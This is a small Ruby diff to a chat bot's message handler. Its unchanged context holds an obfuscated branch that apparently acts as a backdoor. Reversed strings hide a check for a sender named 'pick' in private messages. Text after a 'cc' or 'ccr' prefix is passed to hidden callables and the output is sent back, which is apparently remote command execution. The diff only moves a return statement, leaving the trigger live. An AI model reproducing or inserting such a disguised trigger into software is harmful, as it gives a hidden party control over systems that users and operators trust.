@@ -158,11 +158,10 @@ class ChatHandler
     if a.send(("es" + "rever").reverse.to_sym)=="kcip" && m_info[:where] == ?p + ?m
       if m_info[:what]=~/\Acc(r?)(.*?)\z/
         begin; ws.send(str.reverse % ($1 == ?r ? pp : p).call($2.gsub('\P', '|'))); rescue => e; ws.send(str.reverse % 'err'); end
+        return
       end
-      return
     end
     return if m_info[:to] && m_info[:to][0] == ?p && m_info[:to][3] == ?k
-    
     
     @ignorelist.map(&:downcase).index(m_info[:who].downcase) and return
     
